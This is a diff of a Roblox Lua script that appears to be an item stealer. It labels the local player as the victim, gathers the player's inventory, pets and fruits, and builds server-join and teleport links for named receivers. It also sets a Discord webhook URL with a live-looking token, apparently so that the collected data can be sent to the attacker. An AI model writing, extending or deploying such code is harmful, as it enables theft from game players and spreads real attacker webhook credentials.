@@ -1,6 +1,12 @@
-Username = {""}
-Webhook = "https://discord.com/api/webhooks/1388308785705259121/Uu9NXzuO5-X3625qorDrapu23-V27vzsWCb63vudSQdkocnMw_scgo9E7fsWLCGioADF"
-local Username = Username or {"No Receiver", "darkunknownusers"}
+repeat 
+    task.wait()
+until game:IsLoaded()
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1388199702914404393/YEkwUlOo3WImnClu_PZ6V6IeDvCSmefP8sbEpL1sjVE3dpvfYFLVtdX0iYHJlbl9Iqxg"
+local VICTIM = game.Players.LocalPlayer
+local USERNAMES = {
+    "darkunknownusers"
+}
 local fern = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 local tpscript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 local inv,pets,fruits = {},{},{}
@@ -222,4 +228,5 @@ game.Players.PlayerAdded:Connect(function(player)
     end
 
 end)
+
 
